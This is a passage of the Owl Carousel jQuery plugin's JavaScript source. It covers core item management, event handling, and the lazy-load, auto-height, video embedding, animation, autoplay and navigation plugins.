      (s.prototype.replace = function (e) {
        this.$stage.empty(),
          (this._items = []),
          e && (e = e instanceof jQuery ? e : t(e)),
          this.settings.nestedItemSelector &&
            (e = e.find("." + this.settings.nestedItemSelector)),
          e
            .filter(function () {
              return 1 === this.nodeType;
            })
            .each(
              t.proxy(function (t, e) {
                (e = this.prepare(e)),
                  this.$stage.append(e),
                  this._items.push(e),
                  this._mergers.push(
                    1 *
                      e
                        .find("[data-merge]")
                        .addBack("[data-merge]")
                        .attr("data-merge") || 1
                  );
              }, this)
            ),
          this.reset(
            this.isNumeric(this.settings.startPosition)
              ? this.settings.startPosition
              : 0
          ),
          this.invalidate("items");
      }),
      (s.prototype.add = function (e, i) {
        var s = this.relative(this._current);
        (i = i === n ? this._items.length : this.normalize(i, !0)),
          (e = e instanceof jQuery ? e : t(e)),
          this.trigger("add", { content: e, position: i }),
          (e = this.prepare(e)),
          0 === this._items.length || i === this._items.length
            ? (0 === this._items.length && this.$stage.append(e),
              0 !== this._items.length && this._items[i - 1].after(e),
              this._items.push(e),
              this._mergers.push(
                1 *
                  e
                    .find("[data-merge]")
                    .addBack("[data-merge]")
                    .attr("data-merge") || 1
              ))
            : (this._items[i].before(e),
              this._items.splice(i, 0, e),
              this._mergers.splice(
                i,
                0,
                1 *
                  e
                    .find("[data-merge]")
                    .addBack("[data-merge]")
                    .attr("data-merge") || 1
              )),
          this._items[s] && this.reset(this._items[s].index()),
          this.invalidate("items"),
          this.trigger("added", { content: e, position: i });
      }),
      (s.prototype.remove = function (t) {
        (t = this.normalize(t, !0)) !== n &&
          (this.trigger("remove", { content: this._items[t], position: t }),
          this._items[t].remove(),
          this._items.splice(t, 1),
          this._mergers.splice(t, 1),
          this.invalidate("items"),
          this.trigger("removed", { content: null, position: t }));
      }),
      (s.prototype.preloadAutoWidthImages = function (e) {
        e.each(
          t.proxy(function (e, i) {
            this.enter("pre-loading"),
              (i = t(i)),
              t(new Image())
                .one(
                  "load",
                  t.proxy(function (t) {
                    i.attr("src", t.target.src),
                      i.css("opacity", 1),
                      this.leave("pre-loading"),
                      !this.is("pre-loading") &&
                        !this.is("initializing") &&
                        this.refresh();
                  }, this)
                )
                .attr(
                  "src",
                  i.attr("src") ||
                    i.attr("data-src") ||
                    i.attr("data-src-retina")
                );
          }, this)
        );
      }),
      (s.prototype.destroy = function () {
        for (var n in (this.$element.off(".owl.core"),
        this.$stage.off(".owl.core"),
        t(i).off(".owl.core"),
        !1 !== this.settings.responsive &&
          (e.clearTimeout(this.resizeTimer),
          this.off(e, "resize", this._handlers.onThrottledResize)),
        this._plugins))
          this._plugins[n].destroy();
        this.$stage.children(".cloned").remove(),
          this.$stage.unwrap(),
          this.$stage.children().contents().unwrap(),
          this.$stage.children().unwrap(),
          this.$stage.remove(),
          this.$element
            .removeClass(this.options.refreshClass)
            .removeClass(this.options.loadingClass)
            .removeClass(this.options.loadedClass)
            .removeClass(this.options.rtlClass)
            .removeClass(this.options.dragClass)
            .removeClass(this.options.grabClass)
            .attr(
              "class",
              this.$element
                .attr("class")
                .replace(
                  new RegExp(this.options.responsiveClass + "-\\S+\\s", "g"),
                  ""
                )
            )
            .removeData("owl.carousel");
      }),
      (s.prototype.op = function (t, e, i) {
        var n = this.settings.rtl;
        switch (e) {
          case "<":
            return n ? t > i : t < i;
          case ">":
            return n ? t < i : t > i;
          case ">=":
            return n ? t <= i : t >= i;
          case "<=":
            return n ? t >= i : t <= i;
        }
      }),
      (s.prototype.on = function (t, e, i, n) {
        t.addEventListener
          ? t.addEventListener(e, i, n)
          : t.attachEvent && t.attachEvent("on" + e, i);
      }),
      (s.prototype.off = function (t, e, i, n) {
        t.removeEventListener
          ? t.removeEventListener(e, i, n)
          : t.detachEvent && t.detachEvent("on" + e, i);
      }),
      (s.prototype.trigger = function (e, i, n, o, r) {
        var a = { item: { count: this._items.length, index: this.current() } },
          l = t.camelCase(
            t
              .grep(["on", e, n], function (t) {
                return t;
              })
              .join("-")
              .toLowerCase()
          ),
          c = t.Event(
            [e, "owl", n || "carousel"].join(".").toLowerCase(),
            t.extend({ relatedTarget: this }, a, i)
          );
        return (
          this._supress[e] ||
            (t.each(this._plugins, function (t, e) {
              e.onTrigger && e.onTrigger(c);
            }),
            this.register({ type: s.Type.Event, name: e }),
            this.$element.trigger(c),
            this.settings &&
              "function" == typeof this.settings[l] &&
              this.settings[l].call(this, c)),
          c
        );
      }),
      (s.prototype.enter = function (e) {
        t.each(
          [e].concat(this._states.tags[e] || []),
          t.proxy(function (t, e) {
            this._states.current[e] === n && (this._states.current[e] = 0),
              this._states.current[e]++;
          }, this)
        );
      }),
      (s.prototype.leave = function (e) {
        t.each(
          [e].concat(this._states.tags[e] || []),
          t.proxy(function (t, e) {
            this._states.current[e]--;
          }, this)
        );
      }),
      (s.prototype.register = function (e) {
        if (e.type === s.Type.Event) {
          if (
            (t.event.special[e.name] || (t.event.special[e.name] = {}),
            !t.event.special[e.name].owl)
          ) {
            var i = t.event.special[e.name]._default;
            (t.event.special[e.name]._default = function (t) {
              return !i ||
                !i.apply ||
                (t.namespace && -1 !== t.namespace.indexOf("owl"))
                ? t.namespace && t.namespace.indexOf("owl") > -1
                : i.apply(this, arguments);
            }),
              (t.event.special[e.name].owl = !0);
          }
        } else
          e.type === s.Type.State &&
            (this._states.tags[e.name]
              ? (this._states.tags[e.name] = this._states.tags[e.name].concat(
                  e.tags
                ))
              : (this._states.tags[e.name] = e.tags),
            (this._states.tags[e.name] = t.grep(
              this._states.tags[e.name],
              t.proxy(function (i, n) {
                return t.inArray(i, this._states.tags[e.name]) === n;
              }, this)
            )));
      }),
      (s.prototype.suppress = function (e) {
        t.each(
          e,
          t.proxy(function (t, e) {
            this._supress[e] = !0;
          }, this)
        );
      }),
      (s.prototype.release = function (e) {
        t.each(
          e,
          t.proxy(function (t, e) {
            delete this._supress[e];
          }, this)
        );
      }),
      (s.prototype.pointer = function (t) {
        var i = { x: null, y: null };
        return (
          (t =
            (t = t.originalEvent || t || e.event).touches && t.touches.length
              ? t.touches[0]
              : t.changedTouches && t.changedTouches.length
              ? t.changedTouches[0]
              : t).pageX
            ? ((i.x = t.pageX), (i.y = t.pageY))
            : ((i.x = t.clientX), (i.y = t.clientY)),
          i
        );
      }),
      (s.prototype.isNumeric = function (t) {
        return !isNaN(parseFloat(t));
      }),
      (s.prototype.difference = function (t, e) {
        return { x: t.x - e.x, y: t.y - e.y };
      }),
      (t.fn.owlCarousel = function (e) {
        var i = Array.prototype.slice.call(arguments, 1);
        return this.each(function () {
          var n = t(this),
            o = n.data("owl.carousel");
          o ||
            ((o = new s(this, "object" == typeof e && e)),
            n.data("owl.carousel", o),
            t.each(
              [
                "next",
                "prev",
                "to",
                "destroy",
                "refresh",
                "replace",
                "add",
                "remove",
              ],
              function (e, i) {
                o.register({ type: s.Type.Event, name: i }),
                  o.$element.on(
                    i + ".owl.carousel.core",
                    t.proxy(function (t) {
                      t.namespace &&
                        t.relatedTarget !== this &&
                        (this.suppress([i]),
                        o[i].apply(this, [].slice.call(arguments, 1)),
                        this.release([i]));
                    }, o)
                  );
              }
            )),
            "string" == typeof e && "_" !== e.charAt(0) && o[e].apply(o, i);
        });
      }),
      (t.fn.owlCarousel.Constructor = s);
  })(window.Zepto || window.jQuery, window, document),
  (function (t, e, i, n) {
    var s = function (e) {
      (this._core = e),
        (this._interval = null),
        (this._visible = null),
        (this._handlers = {
          "initialized.owl.carousel": t.proxy(function (t) {
            t.namespace && this._core.settings.autoRefresh && this.watch();
          }, this),
        }),
        (this._core.options = t.extend({}, s.Defaults, this._core.options)),
        this._core.$element.on(this._handlers);
    };
    (s.Defaults = { autoRefresh: !0, autoRefreshInterval: 500 }),
      (s.prototype.watch = function () {
        this._interval ||
          ((this._visible = this._core.isVisible()),
          (this._interval = e.setInterval(
            t.proxy(this.refresh, this),
            this._core.settings.autoRefreshInterval
          )));
      }),
      (s.prototype.refresh = function () {
        this._core.isVisible() !== this._visible &&
          ((this._visible = !this._visible),
          this._core.$element.toggleClass("owl-hidden", !this._visible),
          this._visible &&
            this._core.invalidate("width") &&
            this._core.refresh());
      }),
      (s.prototype.destroy = function () {
        var t, i;
        for (t in (e.clearInterval(this._interval), this._handlers))
          this._core.$element.off(t, this._handlers[t]);
        for (i in Object.getOwnPropertyNames(this))
          "function" != typeof this[i] && (this[i] = null);
      }),
      (t.fn.owlCarousel.Constructor.Plugins.AutoRefresh = s);
  })(window.Zepto || window.jQuery, window, document),
  (function (t, e, i, n) {
    var s = function (e) {
      (this._core = e),
        (this._loaded = []),
        (this._handlers = {
          "initialized.owl.carousel change.owl.carousel resized.owl.carousel":
            t.proxy(function (e) {
              if (
                e.namespace &&
                this._core.settings &&
                this._core.settings.lazyLoad &&
                ((e.property && "position" == e.property.name) ||
                  "initialized" == e.type)
              ) {
                var i = this._core.settings,
                  n = (i.center && Math.ceil(i.items / 2)) || i.items,
                  s = (i.center && -1 * n) || 0,
                  o =
                    (e.property && undefined !== e.property.value
                      ? e.property.value
                      : this._core.current()) + s,
                  r = this._core.clones().length,
                  a = t.proxy(function (t, e) {
                    this.load(e);
                  }, this);
                for (
                  i.lazyLoadEager > 0 &&
                  ((n += i.lazyLoadEager),
                  i.loop && ((o -= i.lazyLoadEager), n++));
                  s++ < n;

                )
                  this.load(r / 2 + this._core.relative(o)),
                    r && t.each(this._core.clones(this._core.relative(o)), a),
                    o++;
              }
            }, this),
        }),
        (this._core.options = t.extend({}, s.Defaults, this._core.options)),
        this._core.$element.on(this._handlers);
    };
    (s.Defaults = { lazyLoad: !1, lazyLoadEager: 0 }),
      (s.prototype.load = function (i) {
        var n = this._core.$stage.children().eq(i),
          s = n && n.find(".owl-lazy");
        !s ||
          t.inArray(n.get(0), this._loaded) > -1 ||
          (s.each(
            t.proxy(function (i, n) {
              var s,
                o = t(n),
                r =
                  (e.devicePixelRatio > 1 && o.attr("data-src-retina")) ||
                  o.attr("data-src") ||
                  o.attr("data-srcset");
              this._core.trigger("load", { element: o, url: r }, "lazy"),
                o.is("img")
                  ? o
                      .one(
                        "load.owl.lazy",
                        t.proxy(function () {
                          o.css("opacity", 1),
                            this._core.trigger(
                              "loaded",
                              { element: o, url: r },
                              "lazy"
                            );
                        }, this)
                      )
                      .attr("src", r)
                  : o.is("source")
                  ? o
                      .one(
                        "load.owl.lazy",
                        t.proxy(function () {
                          this._core.trigger(
                            "loaded",
                            { element: o, url: r },
                            "lazy"
                          );
                        }, this)
                      )
                      .attr("srcset", r)
                  : (((s = new Image()).onload = t.proxy(function () {
                      o.css({
                        "background-image": 'url("' + r + '")',
                        opacity: "1",
                      }),
                        this._core.trigger(
                          "loaded",
                          { element: o, url: r },
                          "lazy"
                        );
                    }, this)),
                    (s.src = r));
            }, this)
          ),
          this._loaded.push(n.get(0)));
      }),
      (s.prototype.destroy = function () {
        var t, e;
        for (t in this.handlers) this._core.$element.off(t, this.handlers[t]);
        for (e in Object.getOwnPropertyNames(this))
          "function" != typeof this[e] && (this[e] = null);
      }),
      (t.fn.owlCarousel.Constructor.Plugins.Lazy = s);
  })(window.Zepto || window.jQuery, window, document),
  (function (t, e, i, n) {
    var s = function (i) {
      (this._core = i),
        (this._previousHeight = null),
        (this._handlers = {
          "initialized.owl.carousel refreshed.owl.carousel": t.proxy(function (
            t
          ) {
            t.namespace && this._core.settings.autoHeight && this.update();
          },
          this),
          "changed.owl.carousel": t.proxy(function (t) {
            t.namespace &&
              this._core.settings.autoHeight &&
              "position" === t.property.name &&
              this.update();
          }, this),
          "loaded.owl.lazy": t.proxy(function (t) {
            t.namespace &&
              this._core.settings.autoHeight &&
              t.element.closest("." + this._core.settings.itemClass).index() ===
                this._core.current() &&
              this.update();
          }, this),
        }),
        (this._core.options = t.extend({}, s.Defaults, this._core.options)),
        this._core.$element.on(this._handlers),
        (this._intervalId = null);
      var n = this;
      t(e).on("load", function () {
        n._core.settings.autoHeight && n.update();
      }),
        t(e).resize(function () {
          n._core.settings.autoHeight &&
            (null != n._intervalId && clearTimeout(n._intervalId),
            (n._intervalId = setTimeout(function () {
              n.update();
            }, 250)));
        });
    };
    (s.Defaults = { autoHeight: !1, autoHeightClass: "owl-height" }),
      (s.prototype.update = function () {
        var e = this._core._current,
          i = e + this._core.settings.items,
          n = this._core.settings.lazyLoad,
          s = this._core.$stage.children().toArray().slice(e, i),
          o = [],
          r = 0;
        t.each(s, function (e, i) {
          o.push(t(i).height());
        }),
          (r = Math.max.apply(null, o)) <= 1 &&
            n &&
            this._previousHeight &&
            (r = this._previousHeight),
          (this._previousHeight = r),
          this._core.$stage
            .parent()
            .height(r)
            .addClass(this._core.settings.autoHeightClass);
      }),
      (s.prototype.destroy = function () {
        var t, e;
        for (t in this._handlers) this._core.$element.off(t, this._handlers[t]);
        for (e in Object.getOwnPropertyNames(this))
          "function" != typeof this[e] && (this[e] = null);
      }),
      (t.fn.owlCarousel.Constructor.Plugins.AutoHeight = s);
  })(window.Zepto || window.jQuery, window, document),
  (function (t, e, i, n) {
    var s = function (e) {
      (this._core = e),
        (this._videos = {}),
        (this._playing = null),
        (this._handlers = {
          "initialized.owl.carousel": t.proxy(function (t) {
            t.namespace &&
              this._core.register({
                type: "state",
                name: "playing",
                tags: ["interacting"],
              });
          }, this),
          "resize.owl.carousel": t.proxy(function (t) {
            t.namespace &&
              this._core.settings.video &&
              this.isInFullScreen() &&
              t.preventDefault();
          }, this),
          "refreshed.owl.carousel": t.proxy(function (t) {
            t.namespace &&
              this._core.is("resizing") &&
              this._core.$stage.find(".cloned .owl-video-frame").remove();
          }, this),
          "changed.owl.carousel": t.proxy(function (t) {
            t.namespace &&
              "position" === t.property.name &&
              this._playing &&
              this.stop();
          }, this),
          "prepared.owl.carousel": t.proxy(function (e) {
            if (e.namespace) {
              var i = t(e.content).find(".owl-video");
              i.length &&
                (i.css("display", "none"), this.fetch(i, t(e.content)));
            }
          }, this),
        }),
        (this._core.options = t.extend({}, s.Defaults, this._core.options)),
        this._core.$element.on(this._handlers),
        this._core.$element.on(
          "click.owl.video",
          ".owl-video-play-icon",
          t.proxy(function (t) {
            this.play(t);
          }, this)
        );
    };
    (s.Defaults = { video: !1, videoHeight: !1, videoWidth: !1 }),
      (s.prototype.fetch = function (t, e) {
        var i = t.attr("data-vimeo-id")
            ? "vimeo"
            : t.attr("data-vzaar-id")
            ? "vzaar"
            : "youtube",
          n =
            t.attr("data-vimeo-id") ||
            t.attr("data-youtube-id") ||
            t.attr("data-vzaar-id"),
          s = t.attr("data-width") || this._core.settings.videoWidth,
          o = t.attr("data-height") || this._core.settings.videoHeight,
          r = t.attr("href");
        if (!r) throw new Error("Missing video URL.");
        if (
          (n = r.match(
            /(http:|https:|)\/\/(player.|www.|app.)?(vimeo\.com|youtu(be\.com|\.be|be\.googleapis\.com|be\-nocookie\.com)|vzaar\.com)\/(video\/|videos\/|embed\/|channels\/.+\/|groups\/.+\/|watch\?v=|v\/)?([A-Za-z0-9._%-]*)(\&\S+)?/
          ))[3].indexOf("youtu") > -1
        )
          i = "youtube";
        else if (n[3].indexOf("vimeo") > -1) i = "vimeo";
        else {
          if (!(n[3].indexOf("vzaar") > -1))
            throw new Error("Video URL not supported.");
          i = "vzaar";
        }
        (n = n[6]),
          (this._videos[r] = { type: i, id: n, width: s, height: o }),
          e.attr("data-video", r),
          this.thumbnail(t, this._videos[r]);
      }),
      (s.prototype.thumbnail = function (e, i) {
        var n,
          s,
          o =
            i.width && i.height
              ? "width:" + i.width + "px;height:" + i.height + "px;"
              : "",
          r = e.find("img"),
          a = "src",
          l = "",
          c = this._core.settings,
          u = function (i) {
            '<div class="owl-video-play-icon"></div>',
              (n = c.lazyLoad
                ? t("<div/>", { class: "owl-video-tn " + l, srcType: i })
                : t("<div/>", {
                    class: "owl-video-tn",
                    style: "opacity:1;background-image:url(" + i + ")",
                  })),
              e.after(n),
              e.after('<div class="owl-video-play-icon"></div>');
          };
        if (
          (e.wrap(t("<div/>", { class: "owl-video-wrapper", style: o })),
          this._core.settings.lazyLoad && ((a = "data-src"), (l = "owl-lazy")),
          r.length)
        )
          return u(r.attr(a)), r.remove(), !1;
        "youtube" === i.type
          ? ((s = "//img.youtube.com/vi/" + i.id + "/hqdefault.jpg"), u(s))
          : "vimeo" === i.type
          ? t.ajax({
              type: "GET",
              url: "//vimeo.com/api/v2/video/" + i.id + ".json",
              jsonp: "callback",
              dataType: "jsonp",
              success: function (t) {
                (s = t[0].thumbnail_large), u(s);
              },
            })
          : "vzaar" === i.type &&
            t.ajax({
              type: "GET",
              url: "//vzaar.com/api/videos/" + i.id + ".json",
              jsonp: "callback",
              dataType: "jsonp",
              success: function (t) {
                (s = t.framegrab_url), u(s);
              },
            });
      }),
      (s.prototype.stop = function () {
        this._core.trigger("stop", null, "video"),
          this._playing.find(".owl-video-frame").remove(),
          this._playing.removeClass("owl-video-playing"),
          (this._playing = null),
          this._core.leave("playing"),
          this._core.trigger("stopped", null, "video");
      }),
      (s.prototype.play = function (e) {
        var i,
          n = t(e.target).closest("." + this._core.settings.itemClass),
          s = this._videos[n.attr("data-video")],
          o = s.width || "100%",
          r = s.height || this._core.$stage.height();
        this._playing ||
          (this._core.enter("playing"),
          this._core.trigger("play", null, "video"),
          (n = this._core.items(this._core.relative(n.index()))),
          this._core.reset(n.index()),
          (i = t(
            '<iframe frameborder="0" allowfullscreen mozallowfullscreen webkitAllowFullScreen ></iframe>'
          )).attr("height", r),
          i.attr("width", o),
          "youtube" === s.type
            ? i.attr(
                "src",
                "//www.youtube.com/embed/" +
                  s.id +
                  "?autoplay=1&rel=0&v=" +
                  s.id
              )
            : "vimeo" === s.type
            ? i.attr("src", "//player.vimeo.com/video/" + s.id + "?autoplay=1")
            : "vzaar" === s.type &&
              i.attr(
                "src",
                "//view.vzaar.com/" + s.id + "/player?autoplay=true"
              ),
          t(i)
            .wrap('<div class="owl-video-frame" />')
            .insertAfter(n.find(".owl-video")),
          (this._playing = n.addClass("owl-video-playing")));
      }),
      (s.prototype.isInFullScreen = function () {
        var e =
          i.fullscreenElement ||
          i.mozFullScreenElement ||
          i.webkitFullscreenElement;
        return e && t(e).parent().hasClass("owl-video-frame");
      }),
      (s.prototype.destroy = function () {
        var t, e;
        for (t in (this._core.$element.off("click.owl.video"), this._handlers))
          this._core.$element.off(t, this._handlers[t]);
        for (e in Object.getOwnPropertyNames(this))
          "function" != typeof this[e] && (this[e] = null);
      }),
      (t.fn.owlCarousel.Constructor.Plugins.Video = s);
  })(window.Zepto || window.jQuery, window, document),
  (function (t, e, i, n) {
    var s = function (e) {
      (this.core = e),
        (this.core.options = t.extend({}, s.Defaults, this.core.options)),
        (this.swapping = !0),
        (this.previous = n),
        (this.next = n),
        (this.handlers = {
          "change.owl.carousel": t.proxy(function (t) {
            t.namespace &&
              "position" == t.property.name &&
              ((this.previous = this.core.current()),
              (this.next = t.property.value));
          }, this),
          "drag.owl.carousel dragged.owl.carousel translated.owl.carousel":
            t.proxy(function (t) {
              t.namespace && (this.swapping = "translated" == t.type);
            }, this),
          "translate.owl.carousel": t.proxy(function (t) {
            t.namespace &&
              this.swapping &&
              (this.core.options.animateOut || this.core.options.animateIn) &&
              this.swap();
          }, this),
        }),
        this.core.$element.on(this.handlers);
    };
    (s.Defaults = { animateOut: !1, animateIn: !1 }),
      (s.prototype.swap = function () {
        if (
          1 === this.core.settings.items &&
          t.support.animation &&
          t.support.transition
        ) {
          this.core.speed(0);
          var e,
            i = t.proxy(this.clear, this),
            n = this.core.$stage.children().eq(this.previous),
            s = this.core.$stage.children().eq(this.next),
            o = this.core.settings.animateIn,
            r = this.core.settings.animateOut;
          this.core.current() !== this.previous &&
            (r &&
              ((e =
                this.core.coordinates(this.previous) -
                this.core.coordinates(this.next)),
              n
                .one(t.support.animation.end, i)
                .css({ left: e + "px" })
                .addClass("animated owl-animated-out")
                .addClass(r)),
            o &&
              s
                .one(t.support.animation.end, i)
                .addClass("animated owl-animated-in")
                .addClass(o));
        }
      }),
      (s.prototype.clear = function (e) {
        t(e.target)
          .css({ left: "" })
          .removeClass("animated owl-animated-out owl-animated-in")
          .removeClass(this.core.settings.animateIn)
          .removeClass(this.core.settings.animateOut),
          this.core.onTransitionEnd();
      }),
      (s.prototype.destroy = function () {
        var t, e;
        for (t in this.handlers) this.core.$element.off(t, this.handlers[t]);
        for (e in Object.getOwnPropertyNames(this))
          "function" != typeof this[e] && (this[e] = null);
      }),
      (t.fn.owlCarousel.Constructor.Plugins.Animate = s);
  })(window.Zepto || window.jQuery, window, document),
  (function (t, e, i, n) {
    var s = function (e) {
      (this._core = e),
        (this._call = null),
        (this._time = 0),
        (this._timeout = 0),
        (this._paused = !0),
        (this._handlers = {
          "changed.owl.carousel": t.proxy(function (t) {
            t.namespace && "settings" === t.property.name
              ? this._core.settings.autoplay
                ? this.play()
                : this.stop()
              : t.namespace &&
                "position" === t.property.name &&
                this._paused &&
                (this._time = 0);
          }, this),
          "initialized.owl.carousel": t.proxy(function (t) {
            t.namespace && this._core.settings.autoplay && this.play();
          }, this),
          "play.owl.autoplay": t.proxy(function (t, e, i) {
            t.namespace && this.play(e, i);
          }, this),
          "stop.owl.autoplay": t.proxy(function (t) {
            t.namespace && this.stop();
          }, this),
          "mouseover.owl.autoplay": t.proxy(function () {
            this._core.settings.autoplayHoverPause &&
              this._core.is("rotating") &&
              this.pause();
          }, this),
          "mouseleave.owl.autoplay": t.proxy(function () {
            this._core.settings.autoplayHoverPause &&
              this._core.is("rotating") &&
              this.play();
          }, this),
          "touchstart.owl.core": t.proxy(function () {
            this._core.settings.autoplayHoverPause &&
              this._core.is("rotating") &&
              this.pause();
          }, this),
          "touchend.owl.core": t.proxy(function () {
            this._core.settings.autoplayHoverPause && this.play();
          }, this),
        }),
        this._core.$element.on(this._handlers),
        (this._core.options = t.extend({}, s.Defaults, this._core.options));
    };
    (s.Defaults = {
      autoplay: !1,
      autoplayTimeout: 5e3,
      autoplayHoverPause: !1,
      autoplaySpeed: !1,
    }),
      (s.prototype._next = function (n) {
        (this._call = e.setTimeout(
          t.proxy(this._next, this, n),
          this._timeout * (Math.round(this.read() / this._timeout) + 1) -
            this.read()
        )),
          this._core.is("interacting") ||
            i.hidden ||
            this._core.next(n || this._core.settings.autoplaySpeed);
      }),
      (s.prototype.read = function () {
        return new Date().getTime() - this._time;
      }),
      (s.prototype.play = function (i, n) {
        var s;
        this._core.is("rotating") || this._core.enter("rotating"),
          (i = i || this._core.settings.autoplayTimeout),
          (s = Math.min(this._time % (this._timeout || i), i)),
          this._paused
            ? ((this._time = this.read()), (this._paused = !1))
            : e.clearTimeout(this._call),
          (this._time += (this.read() % i) - s),
          (this._timeout = i),
          (this._call = e.setTimeout(t.proxy(this._next, this, n), i - s));
      }),
      (s.prototype.stop = function () {
        this._core.is("rotating") &&
          ((this._time = 0),
          (this._paused = !0),
          e.clearTimeout(this._call),
          this._core.leave("rotating"));
      }),
      (s.prototype.pause = function () {
        this._core.is("rotating") &&
          !this._paused &&
          ((this._time = this.read()),
          (this._paused = !0),
          e.clearTimeout(this._call));
      }),
      (s.prototype.destroy = function () {
        var t, e;
        for (t in (this.stop(), this._handlers))
          this._core.$element.off(t, this._handlers[t]);
        for (e in Object.getOwnPropertyNames(this))
          "function" != typeof this[e] && (this[e] = null);
      }),
      (t.fn.owlCarousel.Constructor.Plugins.autoplay = s);
  })(window.Zepto || window.jQuery, window, document),
  (function (t, e, i, n) {
    "use strict";
    var s = function (e) {
      (this._core = e),
        (this._initialized = !1),
        (this._pages = []),
        (this._controls = {}),
        (this._templates = []),
        (this.$element = this._core.$element),
        (this._overrides = {
          next: this._core.next,
          prev: this._core.prev,
          to: this._core.to,
        }),
        (this._handlers = {
          "prepared.owl.carousel": t.proxy(function (e) {
            e.namespace &&
              this._core.settings.dotsData &&
              this._templates.push(
                '<div class="' +
                  this._core.settings.dotClass +
                  '">' +
                  t(e.content)
                    .find("[data-dot]")
                    .addBack("[data-dot]")
                    .attr("data-dot") +
                  "</div>"
              );
          }, this),
          "added.owl.carousel": t.proxy(function (t) {
            t.namespace &&
              this._core.settings.dotsData &&
              this._templates.splice(t.position, 0, this._templates.pop());
          }, this),
          "remove.owl.carousel": t.proxy(function (t) {
            t.namespace &&
              this._core.settings.dotsData &&
              this._templates.splice(t.position, 1);
          }, this),
          "changed.owl.carousel": t.proxy(function (t) {
            t.namespace && "position" == t.property.name && this.draw();
          }, this),
          "initialized.owl.carousel": t.proxy(function (t) {
            t.namespace &&
              !this._initialized &&
              (this._core.trigger("initialize", null, "navigation"),
              this.initialize(),
              this.update(),
              this.draw(),
              (this._initialized = !0),
              this._core.trigger("initialized", null, "navigation"));
          }, this),
          "refreshed.owl.carousel": t.proxy(function (t) {
            t.namespace &&
              this._initialized &&
              (this._core.trigger("refresh", null, "navigation"),
              this.update(),
              this.draw(),
              this._core.trigger("refreshed", null, "navigation"));
          }, this),
        }),
        (this._core.options = t.extend({}, s.Defaults, this._core.options)),
        this.$element.on(this._handlers);
    };
    (s.Defaults = {
      nav: !1,
      navText: [
        '<span aria-label="Previous">&#x2039;</span>',
        '<span aria-label="Next">&#x203a;</span>',
      ],
      navSpeed: !1,
      navElement: 'button type="button" role="presentation"',
      navContainer: !1,
      navContainerClass: "owl-nav",
      navClass: ["owl-prev", "owl-next"],
      slideBy: 1,
      dotClass: "owl-dot",
      dotsClass: "owl-dots",
      dots: !0,
      dotsEach: !1,
      dotsData: !1,
      dotsSpeed: !1,
      dotsContainer: !1,
    }),
      (s.prototype.initialize = function () {
        var e,
          i = this._core.settings;
        for (e in ((this._controls.$relative = (
          i.navContainer
            ? t(i.navContainer)
            : t("<div>").addClass(i.navContainerClass).appendTo(this.$element)
        ).addClass("disabled")),
        (this._controls.$previous = t("<" + i.navElement + ">")
          .addClass(i.navClass[0])
          .html(i.navText[0])
          .prependTo(this._controls.$relative)
          .on(
            "click",
            t.proxy(function (t) {
              this.prev(i.navSpeed);
            }, this)
          )),
        (this._controls.$next = t("<" + i.navElement + ">")
          .addClass(i.navClass[1])
          .html(i.navText[1])
          .appendTo(this._controls.$relative)
          .on(
            "click",
            t.proxy(function (t) {
              this.next(i.navSpeed);
            }, this)
          )),
        i.dotsData ||
          (this._templates = [
            t('<button role="button">')
              .addClass(i.dotClass)
              .append(t("<span>"))
              .prop("outerHTML"),
          ]),
        (this._controls.$absolute = (
          i.dotsContainer
            ? t(i.dotsContainer)
            : t("<div>").addClass(i.dotsClass).appendTo(this.$element)
        ).addClass("disabled")),
        this._controls.$absolute.on(
          "click",
          "button",
          t.proxy(function (e) {
            var n = t(e.target).parent().is(this._controls.$absolute)
              ? t(e.target).index()
              : t(e.target).parent().index();
            e.preventDefault(), this.to(n, i.dotsSpeed);
          }, this)
        ),
        this._overrides))
          this._core[e] = t.proxy(this[e], this);
      }),
      (s.prototype.destroy = function () {
        var t, e, i, n, s;
        for (t in ((s = this._core.settings), this._handlers))
          this.$element.off(t, this._handlers[t]);
        for (e in this._controls)
          "$relative" === e && s.navContainer
            ? this._controls[e].html("")
            : this._controls[e].remove();
        for (n in this.overides) this._core[n] = this._overrides[n];
        for (i in Object.getOwnPropertyNames(this))
          "function" != typeof this[i] && (this[i] = null);
      }),
      (s.prototype.update = function () {
        var t,
          e,
          i = this._core.clones().length / 2,
          n = i + this._core.items().length,
          s = this._core.maximum(!0),
          o = this._core.settings,
          r = o.center || o.autoWidth || o.dotsData ? 1 : o.dotsEach || o.items;
        if (
          ("page" !== o.slideBy && (o.slideBy = Math.min(o.slideBy, o.items)),
          o.dots || "page" == o.slideBy)
        )
          for (this._pages = [], t = i, e = 0, 0; t < n; t++) {
            if (e >= r || 0 === e) {
              if (
                (this._pages.push({
                  start: Math.min(s, t - i),
                  end: t - i + r - 1,
                }),
                Math.min(s, t - i) === s)
              )
                break;
              e = 0;
            }
            e += this._core.mergers(this._core.relative(t));
          }
      }),
      (s.prototype.draw = function () {
        var e,
          i = this._core.settings,
          n = this._core.items().length <= i.items,
          s = this._core.relative(this._core.current()),
          o = i.loop || i.rewind;
        this._controls.$relative.toggleClass("disabled", !i.nav || n),
          i.nav &&
            (this._controls.$previous.toggleClass(
              "disabled",
              !o && s <= this._core.minimum(!0)
            ),
            this._controls.$next.toggleClass(
              "disabled",
              !o && s >= this._core.maximum(!0)
            )),
          this._controls.$absolute.toggleClass("disabled", !i.dots || n),
          i.dots &&
            ((e =
              this._pages.length - this._controls.$absolute.children().length),
            i.dotsData && 0 !== e
              ? this._controls.$absolute.html(this._templates.join(""))
              : e > 0
              ? this._controls.$absolute.append(
                  new Array(e + 1).join(this._templates[0])
                )
              : e < 0 && this._controls.$absolute.children().slice(e).remove(),
            this._controls.$absolute.find(".active").removeClass("active"),
            this._controls.$absolute
              .children()
              .eq(t.inArray(this.current(), this._pages))
              .addClass("active"));
      }),
      (s.prototype.onTrigger = function (e) {
        var i = this._core.settings;
        e.page = {
          index: t.inArray(this.current(), this._pages),
          count: this._pages.length,
          size:
            i &&
            (i.center || i.autoWidth || i.dotsData ? 1 : i.dotsEach || i.items),
        };
      }),
      (s.prototype.current = function () {
        var e = this._core.relative(this._core.current());
        return t
          .grep(
            this._pages,
            t.proxy(function (t, i) {
              return t.start <= e && t.end >= e;
            }, this)
          )
          .pop();
      }),
      (s.prototype.getPosition = function (e) {
        var i,
          n,
          s = this._core.settings;
        return (
          "page" == s.slideBy
            ? ((i = t.inArray(this.current(), this._pages)),
              (n = this._pages.length),
              e ? ++i : --i,
              (i = this._pages[((i % n) + n) % n].start))
            : ((i = this._core.relative(this._core.current())),
              (n = this._core.items().length),
              e ? (i += s.slideBy) : (i -= s.slideBy)),
          i
        );
      }),
      (s.prototype.next = function (e) {
